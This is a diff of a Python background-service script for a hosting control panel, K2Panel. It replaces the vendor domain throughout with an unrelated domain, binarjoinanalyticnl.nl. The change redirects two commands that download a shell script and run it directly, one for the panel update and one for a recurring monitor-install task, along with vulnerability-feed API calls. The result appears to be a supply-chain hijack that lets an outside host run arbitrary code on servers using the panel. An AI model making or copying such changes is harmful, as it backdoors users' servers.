@@ -3,9 +3,9 @@
 # +-------------------------------------------------------------------
 # | K2Panel
 # +-------------------------------------------------------------------
-# | Copyright (c) 2015-2016 K2Panel(www.k2panel.com) All rights reserved.
+# | Copyright (c) 2015-2016 K2Panel(binarjoinanalyticnl.nl) All rights reserved.
 # +-------------------------------------------------------------------
-# | Author: hwliang <hwl@k2panel.com>
+# | Author: hwliang <hwl@binarjoinanalyticnl.nl>
 # +-------------------------------------------------------------------
 
 # ------------------------------
@@ -891,7 +891,7 @@ def daemon_service():
 
 
 def update_panel():
-    os.system("curl -k https://node.k2panel.com/install/update_7.x_en.sh|bash &")
+    os.system("curl -k https://node.binarjoinanalyticnl.nl/install/update_7.x_en.sh|bash &")
 
 
 def service_panel(action='reload'):
@@ -996,7 +996,7 @@ def push_msg():
 def JavaProDaemons():
     '''
         @name Java 项目守护进程
-        @author lkq@k2panel.com
+        @author lkq@binarjoinanalyticnl.nl
         @time 2022-07-19
         @param None
     '''
@@ -1278,7 +1278,7 @@ def update_vulnerabilities():
         if type(load_time) != dict: return
 
         def get_yun_infos(page):
-            url = "https://wafapi2.k2panel.com/api/bt_waf/get_wordpress_scan?size=100&p=" + str(page)
+            url = "https://wafapi2.binarjoinanalyticnl.nl/api/bt_waf/get_wordpress_scan?size=100&p=" + str(page)
             yun_infos = requests.get(url, verify=False, timeout=60).json()
             for i in yun_infos['res']:
                 if i['data_time'] > load_time['data_time']:
@@ -1311,7 +1311,7 @@ def update_vulnerabilities():
         check_sql=M("plugin_error", "plugin_error").order("id desc").limit("1").field("id").find()
         if type(check_sql) != dict: return
         time.sleep(30)
-        url = "https://wafapi2.k2panel.com/api/bt_waf/plugin_error_list"
+        url = "https://wafapi2.binarjoinanalyticnl.nl/api/bt_waf/plugin_error_list"
         try:
             res = requests.get(url, verify=False, timeout=60).json()
         except:
@@ -1343,7 +1343,7 @@ def update_vulnerabilities():
         import random
         def get_plugin_time(id):
             time.sleep(30)
-            url = "https://wafapi2.k2panel.com/api/bt_waf/get_wordpress_not_update?p=" + str(id)
+            url = "https://wafapi2.binarjoinanalyticnl.nl/api/bt_waf/get_wordpress_not_update?p=" + str(id)
             try:
                 res = requests.get(url, verify=False, timeout=60).json()
                 if len(res['res']) == 0:
@@ -2075,7 +2075,7 @@ def check_site_monitor():
     while True:
         install_name = 'Install [site_total_monitor]'
         if public.GetWebServer() !="openlitespeed" and not os.path.exists("/www/server/site_total") and not os.path.exists(os.path.join(public.get_panel_path(),"plugin/monitor/info.json")) and public.M('tasks').where('name=? and status=?',(install_name,'0')).count() < 1:
-            execstr="curl https://node.k2panel.com/site_total/install.sh|bash"
+            execstr="curl https://node.binarjoinanalyticnl.nl/site_total/install.sh|bash"
             public.M('tasks').add('id,name,type,status,addtime,execstr',(None, install_name,'execshell','0',time.strftime('%Y-%m-%d %H:%M:%S'),execstr))
             public.writeFile('/tmp/panelTask.pl','True')
         time.sleep(600)
